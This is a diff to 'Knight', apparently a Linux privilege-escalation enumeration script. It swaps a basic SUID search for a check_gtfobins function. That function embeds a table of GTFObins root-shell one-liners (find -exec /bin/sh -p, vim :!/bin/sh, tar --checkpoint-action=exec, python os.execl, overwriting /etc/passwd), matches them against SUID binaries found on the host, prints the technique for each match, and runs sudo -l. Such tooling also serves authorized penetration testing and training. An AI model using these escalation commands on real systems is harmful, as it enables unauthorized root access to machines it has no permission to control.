@@ -59,13 +59,13 @@ function tty_shell() {
 # Function to display Knight version
 function show_version() {
     # Display Knight version
-    echo -e "\nKnight-v(${BPurple}4.3.6${NC})\n"
+    echo -e "\nKnight-v(${BPurple}4.4.6${NC})\n"
 }
 
 # Function to display Knight help message
 function show_help() {
     # Display Knight help message
-    echo -e "\nKnight-v(${BPurple}4.3.6${NC})\n"
+    echo -e "\nKnight-v(${BPurple}4.4.6${NC})\n"
     echo -e "${BPurple}Usage:${NC}"
     echo -e "	./knight                 {Runs the script in ${BPurple}standard${NC} mode}"
     echo -e "	./knight ${BPurple}--version${NC} or ${BPurple}-v${NC} {Displays the Program ${BPurple}version${NC} and exits}"
@@ -153,12 +153,86 @@ function dker() {
     echo
 }
 
-# Function to find binaries with setuid/setgid permissions
-function su_gids() {
-    # Find binaries with setuid/setgid permissions
-    echo -e "\n[${BPurple}+${NC}] ${BBlue}These Binaries${NC} on ${BPurple}GTFObins?${NC}"
-    find / -perm -u=s 2> /dev/null
-    echo
+# Function to find and analyze SUID binaries using GTFObins techniques
+function check_gtfobins() {
+    echo -e "\n[${BPurple}+${NC}] ${BBlue}Checking for${NC} ${BPurple}GTFObins exploitable binaries${NC}"
+    
+    # Dictionary of known GTFObins binaries and their techniques
+    declare -A gtfo_techniques=(
+        ["cp"]="SUID: cp file /etc/passwd"
+        ["bash"]="SUID: ./bash -p"
+        ["vim"]="SUID: vim -c ':!/bin/sh'"
+        ["nano"]="SUID: nano test.txt\n^R^X\nreset; sh 1>&0 2>&0"
+        ["find"]="SUID: find . -exec /bin/sh -p \; -quit"
+        ["nmap"]="SUID: nmap --interactive\nnmap> !sh"
+        ["more"]="SUID: more /etc/profile\n!/bin/sh"
+        ["less"]="SUID: less /etc/profile\n!/bin/sh"
+        ["awk"]="SUID: awk 'BEGIN {system(\"/bin/sh\")}'"
+        ["python"]="SUID: python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
+        ["perl"]="SUID: perl -e 'exec \"/bin/sh\";'"
+        ["ruby"]="SUID: ruby -e 'exec \"/bin/sh\"'"
+        ["mv"]="SUID: mv file /etc/passwd"
+        ["chmod"]="SUID: chmod 6777 /etc/passwd"
+        ["chown"]="SUID: chown root:root file"
+        ["tar"]="SUID: tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
+        ["zip"]="SUID: zip /tmp/test.zip /tmp/test -T --unzip-command=\"sh -c /bin/sh\""
+        ["mount"]="SUID: mount -o bind /bin/sh /bin/mount\n./mount"
+        ["sudo"]="SUDO: sudo /bin/sh"
+    )
+
+    # Find all SUID binaries
+    echo -e "\n[${BPurple}+${NC}] ${BBlue}Searching for SUID binaries...${NC}"
+    SUID_BINS=$(find / -perm -4000 -type f 2>/dev/null)
+
+    # Check each found binary against our GTFObins database
+    echo -e "\n[${BPurple}+${NC}] ${BBlue}Analyzing found binaries...${NC}\n"
+    
+    EXPLOITABLE_COUNT=0
+    
+    while IFS= read -r binary; do
+        binary_name=$(basename "$binary")
+        if [[ ${gtfo_techniques[$binary_name]+_} ]]; then
+            EXPLOITABLE_COUNT=$((EXPLOITABLE_COUNT + 1))
+            echo -e "${BGreen}[!] Found exploitable binary:${NC} $binary"
+            echo -e "${BBlue}[>] GTFObins technique:${NC}\n${gtfo_techniques[$binary_name]}\n"
+            
+            # Check if binary is actually executable by current user
+            if [ -x "$binary" ]; then
+                echo -e "${BGreen}[+] Binary is executable by current user${NC}"
+            else
+                echo -e "${BRed}[-] Binary is not executable by current user${NC}"
+            fi
+            
+            # Check version of the binary if possible
+            if [ -x "$binary" ]; then
+                version=$($binary --version 2>/dev/null | head -n1 || echo "Version not available")
+                echo -e "${BBlue}[>] Version:${NC} $version\n"
+            fi
+            
+            echo -e "${BPurple}[>] Full path:${NC} $binary"
+            echo -e "${BPurple}[>] Permissions:${NC} $(ls -l "$binary")\n"
+            echo -e "-------------------------------------------"
+        fi
+    done <<< "$SUID_BINS"
+    
+    if [ $EXPLOITABLE_COUNT -eq 0 ]; then
+        echo -e "${BRed}[-] No known GTFObins exploitable binaries found${NC}\n"
+    else
+        echo -e "\n${BGreen}[+] Found $EXPLOITABLE_COUNT potentially exploitable binaries!${NC}"
+        echo -e "${BBlue}[>] You can visit https://gtfobins.github.io/ for more detailed exploitation techniques${NC}\n"
+    fi
+
+    # Additional check for sudo rights
+    if command -v sudo >/dev/null 2>&1; then
+        echo -e "\n[${BPurple}+${NC}] ${BBlue}Checking sudo permissions...${NC}"
+        sudo_output=$(sudo -l 2>/dev/null)
+        if [ $? -eq 0 ]; then
+            echo -e "${BGreen}[!] Sudo rights found:${NC}\n$sudo_output"
+            echo -e "\n${BBlue}[>] Check these binaries on GTFObins for sudo exploitation techniques${NC}"
+        else
+            echo -e "${BRed}[-] No sudo rights found or sudo password required${NC}"
+        fi
+    fi
 }
 
 # Function to display bash history
@@ -253,7 +327,7 @@ function check_writable_dirs() {
 function exit_program() {
     # Exit the program
     echo ""
-    echo -e "\n[${BPurple}+${NC}] Exiting Knight-v(${BPurple}4.3.6${NC}) at $(date +%T)\n"
+    echo -e "\n[${BPurple}+${NC}] Exiting Knight-v(${BPurple}4.4.6${NC}) at $(date +%T)\n"
     exit 0
 }
 
@@ -698,7 +772,6 @@ function main() {
         "cronjobs" \
         "keys_ssh" \
         "docker" \
-        "SU_GIDs" \
         "bash_history" \
         "config_code" \
         "hidden_service_and_network" \
@@ -707,6 +780,7 @@ function main() {
         "console_clear" \
         "docker-scan" \
         "check_writable_dirs" \
+        "check_gtfobins" \
         "check_logrotten" \
         "check_dirty_cow" \
         "check_CVE_2023_26604" \
@@ -744,8 +818,6 @@ function main() {
                     keys_ssh;;
                 docker)
                     dker;;
-                SU_GIDs)
-                    su_gids;;
                 bash_history)
                     bash_history;;
                 check_writable_dirs)
@@ -756,6 +828,8 @@ function main() {
                     hidden_service_and_network;;
                 NFS_shares)
                     nfs;;
+                check_gtfobins)
+                    check_gtfobins;;
                 console_clear)
                     console_clear;;
                 search_wordpress_config)
@@ -793,7 +867,7 @@ then
     echo -e "\e[3m${BBlue}May the strength of sudoers be with you${NC}\e[0m"
 
 else
-    echo -e "\n[${BPurple}+${NC}] Knight-v(${BPurple}4.3.6${NC}) ${BPurple}initialzing${NC} on ${BPurple}$(uname -a | awk '{print $2}')${NC} at $(date +%T)\n"
+    echo -e "\n[${BPurple}+${NC}] Knight-v(${BPurple}4.4.6${NC}) ${BPurple}initialzing${NC} on ${BPurple}$(uname -a | awk '{print $2}')${NC} at $(date +%T)\n"
     # Initialize Knight
     main
 fi
